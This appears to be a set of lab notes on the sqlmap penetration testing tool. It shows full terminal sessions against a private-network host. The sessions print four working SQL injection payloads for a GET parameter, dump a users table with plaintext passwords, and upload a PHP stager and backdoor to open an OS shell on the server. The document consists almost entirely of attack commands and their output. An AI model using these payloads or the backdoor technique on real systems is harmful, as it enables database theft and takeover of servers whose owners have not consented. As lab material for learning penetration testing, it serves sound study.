# SQL Map

Site: https://sqlmap.org/

> sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

## Testing parameter
```sh
┌──(grenierdev㉿kali)-[~]
└─$ sqlmap -u http://192.168.187.10/debug.php?id=1 -p "id"
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:24:20 /2022-03-17/

[15:24:20] [INFO] testing connection to the target URL
[15:24:20] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:24:20] [INFO] testing if the target URL content is stable
[15:24:21] [INFO] target URL content is stable
[15:24:21] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[15:24:21] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[15:24:21] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
[15:24:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:24:45] [WARNING] reflective value(s) found and filtering out
[15:24:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Jake")
[15:24:46] [INFO] testing 'Generic inline queries'
[15:24:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:24:46] [INFO] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
[15:24:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:24:46] [WARNING] time-based comparison requires larger statistical model, please wait..................... (done)
[15:25:02] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[15:25:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:25:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:25:02] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:25:03] [INFO] target URL appears to have 3 columns in query
[15:25:04] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4086=4086

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1 AND EXTRACTVALUE(2960,CONCAT(0x5c,0x7170787671,(SELECT (ELT(2960=2960,1))),0x7171786a71))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4430 FROM (SELECT(SLEEP(5)))Uiep)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7170787671,0x47574c4375486141427977646e694e42585a514a53726859715358744a45716d484e6b4569727970,0x7171786a71),NULL-- -
---
[15:25:34] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: Apache 2.4.33, PHP 7.2.4
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[15:25:34] [INFO] fetched data logged to text files under '/home/grenierdev/.local/share/sqlmap/output/192.168.187.10'

[*] ending @ 15:25:34 /2022-03-17/

```

## Dump database
```sh
┌──(grenierdev㉿kali)-[~]
└─$ sqlmap -u http://192.168.187.10/debug.php?id=1 -p "id" --dbms=mysql --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:26:23 /2022-03-17/

[15:26:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4086=4086

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1 AND EXTRACTVALUE(2960,CONCAT(0x5c,0x7170787671,(SELECT (ELT(2960=2960,1))),0x7171786a71))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4430 FROM (SELECT(SLEEP(5)))Uiep)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7170787671,0x47574c4375486141427977646e694e42585a514a53726859715358744a45716d484e6b4569727970,0x7171786a71),NULL-- -
---
[15:26:24] [INFO] testing MySQL
[15:26:24] [INFO] confirming MySQL
[15:26:25] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: Apache 2.4.33, PHP 7.2.4
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[15:26:25] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:26:25] [INFO] fetching current database
[15:26:25] [INFO] fetching tables for database: 'webappdb'
[15:26:25] [INFO] fetching columns for table 'users' in database 'webappdb'
[15:26:26] [INFO] fetching entries for table 'users' in database 'webappdb'
Database: webappdb
Table: users
[2 entries]
+----+--------------+----------+
| id | password     | username |
+----+--------------+----------+
| 1  | p@ssw0rd     | admin    |
| 2  | footworklure | jigsaw   |
+----+--------------+----------+

[15:26:26] [INFO] table 'webappdb.users' dumped to CSV file '/home/grenierdev/.local/share/sqlmap/output/192.168.187.10/dump/webappdb/users.csv'
[15:26:26] [INFO] fetching columns for table 'feedback' in database 'webappdb'
[15:26:27] [INFO] fetching entries for table 'feedback' in database 'webappdb'
Database: webappdb
Table: feedback
[2 entries]
+----+------+----------------------------------------------+
| id | name | text                                         |
+----+------+----------------------------------------------+
| 1  | Jake | Great tacos today!                           |
| 2  | John | I would eat tacos here every day if I could! |
+----+------+----------------------------------------------+

[15:26:27] [INFO] table 'webappdb.feedback' dumped to CSV file '/home/grenierdev/.local/share/sqlmap/output/192.168.187.10/dump/webappdb/feedback.csv'
[15:26:27] [INFO] fetched data logged to text files under '/home/grenierdev/.local/share/sqlmap/output/192.168.187.10'

[*] ending @ 15:26:27 /2022-03-17/

```

## Shell
```sh
┌──(grenierdev㉿kali)-[~]
└─$ sqlmap -u http://192.168.187.10/debug.php?id=1 -p "id" --dbms=mysql --os-shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:27:58 /2022-03-17/

[15:27:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4086=4086

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1 AND EXTRACTVALUE(2960,CONCAT(0x5c,0x7170787671,(SELECT (ELT(2960=2960,1))),0x7171786a71))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4430 FROM (SELECT(SLEEP(5)))Uiep)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7170787671,0x47574c4375486141427977646e694e42585a514a53726859715358744a45716d484e6b4569727970,0x7171786a71),NULL-- -
---
[15:27:58] [INFO] testing MySQL
[15:27:58] [INFO] confirming MySQL
[15:27:59] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: Apache 2.4.33, PHP 7.2.4
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[15:27:59] [INFO] going to use a web backdoor for command prompt
[15:27:59] [INFO] fingerprinting the back-end DBMS operating system
[15:27:59] [INFO] the back-end DBMS operating system is Windows
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
[15:28:03] [INFO] retrieved the web server document root: 'C:\xampp\htdocs'
[15:28:03] [INFO] retrieved web server absolute paths: 'C:/xampp/htdocs/debug.php'
[15:28:03] [INFO] trying to upload the file stager on 'C:/xampp/htdocs/' via LIMIT 'LINES TERMINATED BY' method
[15:28:04] [INFO] the file stager has been successfully uploaded on 'C:/xampp/htdocs/' - http://192.168.187.10:80/tmpucshd.php
[15:28:04] [INFO] the backdoor has been successfully uploaded on 'C:/xampp/htdocs/' - http://192.168.187.10:80/tmpbcjtt.php
[15:28:04] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] a
command standard output: 'client251\admin'
os-shell> quit
[15:28:56] [INFO] cleaning up the web files uploaded
[15:28:56] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 2 times
[15:28:56] [INFO] fetched data logged to text files under '/home/grenierdev/.local/share/sqlmap/output/192.168.187.10'

[*] ending @ 15:28:56 /2022-03-17/
```